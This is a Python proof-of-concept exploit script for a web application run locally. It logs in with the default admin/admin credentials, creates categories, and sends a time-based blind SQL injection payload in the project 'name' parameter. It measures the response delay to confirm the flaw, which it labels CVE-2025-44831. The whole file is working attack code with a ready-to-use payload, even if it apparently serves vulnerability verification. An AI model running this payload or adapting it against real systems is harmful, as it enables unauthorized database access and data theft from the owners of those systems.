#!/usr/bin/env python3
import requests
import time
import sys

TARGET = "http://localhost:8081"

def login(session, username="admin", password="admin"):
    resp = session.post(f"{TARGET}/post", data={"uname": username, "pwd": password}, allow_redirects=False)
    return resp.status_code == 301 and resp.headers.get("Location") == "/"

def create_category(session, title, code, grade=2):
    resp = session.post(f"{TARGET}/admin/category/addcategory", data={
        "title": title,
        "code": code,
        "grade": str(grade),
        "pid": "0"
    })
    return resp.status_code == 200

def get_categories(session):
    resp = session.get(f"{TARGET}/admin/category/0")
    if resp.status_code == 200:
        return resp.json()
    return []

def create_project(session, code, name, ids):
    start = time.time()
    resp = session.post(f"{TARGET}/project/addproject", data={
        "code": code,
        "name": name,
        "label": "",
        "principal": "",
        "ids": ids
    })
    elapsed = time.time() - start
    return resp.status_code == 200, elapsed * 1000

def main():
    session = requests.Session()
    
    print("[*] Logging in as admin...")
    if not login(session):
        print("[-] Login failed")
        return False
    print("[+] Login successful")
    
    print("[*] Creating categories for exploitation...")
    create_category(session, "testcat1", "tc1", 2)
    create_category(session, "testcat2", "tc2", 3)
    
    categories = get_categories(session)
    if len(categories) < 2:
        print("[-] Failed to create categories")
        return False
    
    cat_ids = ",".join([str(c["Id"]) for c in categories[:2]])
    print(f"[+] Categories created, IDs: {cat_ids}")
    
    print("[*] Testing NORMAL request...")
    success, normal_time = create_project(session, "prj_norm", "NormalProject", cat_ids)
    print(f"[+] Normal request time: {normal_time:.2f} ms")
    
    print("[*] Testing SQL INJECTION (official PoC format)...")
    sqli_payload = "dassda'and(case when(substr(sqlite_version(),1,1)='3')then randomblob(100000000)else 0 end),0,'','')--"
    success, sqli_time = create_project(session, "prj_sqli", sqli_payload, cat_ids)
    print(f"[+] SQLi request time: {sqli_time:.2f} ms")
    
    time_diff = sqli_time - normal_time
    print(f"\n[*] Time difference: {time_diff:.2f} ms")
    
    if time_diff > 100:
        print("[+] SQL INJECTION VULNERABILITY CONFIRMED!")
        print(f"[+] Vulnerability: CVE-2025-44831")
        print(f"[+] Injection point: name parameter -> parenttitlepath field")
        print(f"[+] Vulnerable function: models.Insertproj() using fmt.Sprintf + Raw SQL")
        return True
    else:
        print("[-] Vulnerability not confirmed. Time difference too small.")
        return False

if __name__ == "__main__":
    result = main()
    sys.exit(0 if result else 1)
